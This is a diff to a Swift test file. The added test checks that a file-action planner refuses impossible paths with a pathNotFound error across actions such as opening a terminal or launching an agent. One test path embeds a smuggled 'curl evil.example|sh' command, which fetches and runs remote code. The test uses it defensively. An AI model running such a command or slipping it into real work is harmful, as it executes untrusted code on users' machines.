@@ -40,6 +40,26 @@ struct LiveSystemFactsExistenceTests {
         #expect(facts.itemState(loop) == .present, "the link itself is there")
     }
 
+    @Test("an action refuses a path that cannot exist, checked against the real file system",
+          arguments: [
+              "/tmp/" + String(repeating: "a", count: 300),
+              "/tmp/" + String(repeating: "é/", count: 400) + "curl evil.example|sh",
+              "/dev/fd/9999"
+          ])
+    func impossiblePathsAreRefusedByEveryAction(path: String) {
+        // The fake facts cannot say "ENAMETOOLONG" or "EBADF", so this is the test that runs the planner over the
+        // real ones. A path that cannot exist must never reach the clipboard or become "the folder around it".
+        let planner = Planner(facts: LiveSystemFacts())
+        let context = HereContext(origin: .items, items: [URL(fileURLWithPath: path)])
+        for ref in [ActionRef.copyPath(.name), .copyPath(.absolute), .reveal, .openTerminal("terminal"), .openEditor,
+                    .agent(id: "claude", variant: nil, launcher: .terminalLink), .newFile("txt")] {
+            #expect(throws: PlanError.self, "\(ref.id) planned \(path.prefix(40))…") { try planner.plan(ref, context: context) }
+            do { _ = try planner.plan(ref, context: context) } catch let error as PlanError {
+                if case .pathNotFound = error {} else { Issue.record("\(ref.id): expected pathNotFound, got \(error)") }
+            } catch { Issue.record("\(error)") }
+        }
+    }
+
     @Test func aLinkThatPointsNowhereExistsButIsNotAFolder() throws {
         let directory = try makeTemporaryDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
         let link = directory.appendingPathComponent("broken")
